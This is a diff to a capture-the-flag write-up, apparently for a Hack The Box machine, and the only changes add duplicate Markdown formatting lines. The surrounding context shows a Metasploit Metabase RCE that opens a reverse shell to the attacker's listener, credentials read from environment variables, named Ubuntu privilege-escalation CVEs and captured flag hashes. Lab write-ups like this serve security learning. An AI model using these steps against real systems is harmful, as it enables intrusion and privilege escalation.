@@ -33,6 +33,7 @@ PORT   STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 {: .nolineno}
+{: .nolineno}
 
 ## Web Enumeration ⤵️
 
@@ -110,6 +111,7 @@ msf6 exploit(linux/http/metabase_setup_token_rce) > run
 [*] Command shell session 1 opened (10.10.14.193:4444 -> 10.10.11.233:49796) at 2023-10-25 20:37:06 +0530
 ```
 {: .nolineno}
+{: .nolineno}
 
 Now I ran the environment variable and got some credentials from it →
 
@@ -158,6 +160,7 @@ _=/usr/bin/env
 OLDPWD=/app
 b279cd18d8ff:/$
 ```
+{: .nolineno}
 {: .nolineno}
 
 Now lets have a shell for metanalytics →
@@ -233,6 +236,7 @@ b4fcaf112c5bd2fae24cb1c1a8b9a62d
 metalytics@analytics:~$
 ```
 {: .nolineno}
+{: .nolineno}
 
 I searched on web realted to OS version exploit and I got this →
 
@@ -256,6 +260,7 @@ PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-poli
 UBUNTU_CODENAME=jammy
 metalytics@analytics:~$
 ```
+{: .nolineno}
 {: .nolineno}
 
 I found 2 CVEs that are **CVE-2023-2640 and CVE-2023-32629** and its details where I tried this exploit :
@@ -293,6 +298,7 @@ root@analytics:/root# cat root.txt
 e89e3986fc936ccca2d00116ce214656
 root@analytics:/root#
 ```
+{: .nolineno}
 {: .nolineno}
 
 I am root now !!
